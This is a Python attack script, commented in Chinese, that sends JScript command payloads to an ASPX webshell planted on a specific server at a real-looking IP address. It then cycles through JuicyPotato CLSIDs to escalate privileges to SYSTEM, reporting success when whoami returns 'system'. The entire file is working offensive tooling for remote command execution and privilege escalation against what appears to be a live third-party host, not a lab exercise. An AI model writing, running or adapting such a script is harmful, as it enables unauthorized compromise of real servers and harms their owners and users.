import requests
import urllib.parse

# ================= 配置区域 =================
# WebShell URL
SHELL_URL = "http://120.55.241.236:999/Answer/08118106%20%E8%AE%B8%E6%B7%91%E5%AF%B0/A01/s_3711.aspx"
PASSWORD = "c"

# JuicyPotato 物理路径
JP_PATH = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\08118106 许淑寰\A01\JuicyPotato.exe"

def execute_cmd(cmd):
    try:
        # 构造 JScript Payload
        # 注意对 cmd 中的反斜杠和双引号进行转义
        safe_cmd = cmd.replace("\\", "\\\\").replace("\"", "\\\"")

        # 修改: 不使用 cmd /c，直接通过 WScript.Shell Exec 执行，避免 cmd 对引号解析的坑
        # 只要 exe 路径正确且参数正确，Exec 可以直接运行
        payload = f"""var d=new ActiveXObject("WScript.Shell");var o=d.Exec("{safe_cmd}");Response.Write(o.StdOut.ReadAll());Response.Write(o.StdErr.ReadAll());"""

        params = {
            PASSWORD: payload
        }

        print(f"[*] Executing: {cmd}")
        resp = requests.get(SHELL_URL, params=params, timeout=30) # 提权可能稍微慢点


        if resp.status_code == 200:
            return resp.text.strip()
        else:
            return f"[!] HTTP Error: {resp.status_code}"

    except Exception as e:
        return f"[!] Exception: {e}"

# 常见的 Server 2012 R2 CLSID 列表
# 来源: http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_R2_Datacenter/
CLSIDS = [
    "{e60687f7-01a1-40aa-86ac-db1cbf673334}", # 常见有效
    "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}",
    "{752073d1-23f2-4396-85f0-8fdb879ed0ed}",
    "{03ca98d6-ff5d-49b8-abc6-03dd84127020}",
    "{6d18ad12-bde3-4393-b311-099c346e6df9}"
]

def run_privesc():
    print("=== JuicyPotato 提权测试 (遍历 CLSID) ===")

    for clsid in CLSIDS:
        print(f"\n[*] Trying CLSID: {clsid}")

        # 构造提权命令，增加 -c 参数
        # -l 监听端口可以稍微变一下，防止占用，这里用 1337
        jp_cmd = f'"{JP_PATH}" -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami" -t * -c {clsid}'

        output = execute_cmd(jp_cmd)

        print("[Output]")
        print(output)

        if "system" in output.lower():
            print(f"\n[★ SUCCESS] 恭喜！已获取 SYSTEM 权限！(CLSID: {clsid})")
            return
        elif "recv failed" in output:
            print("    [-] Failed (Socket Error)")
        elif "COM" in output:
            print("    [-] Failed (COM Error)")

    print("\n[!] 所有 CLSID 尝试完毕，未获成功。")

if __name__ == "__main__":
    run_privesc()
